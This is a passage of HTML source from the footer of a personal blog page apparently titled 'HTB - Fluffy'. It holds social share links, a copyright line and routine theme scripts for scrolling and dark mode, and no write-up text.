                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on whatsapp"
            href="https://api.whatsapp.com/send?text=HTB%20-%20Fluffy%20-%20https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on telegram"
            href="https://telegram.me/share/url?text=HTB%20-%20Fluffy&amp;url=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share HTB - Fluffy on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=HTB%20-%20Fluffy&u=https%3a%2f%2fharunmansor.github.io%2fHugo%2fposts%2ffirst%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://harunmansor.github.io/Hugo/">Harun Mansor</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
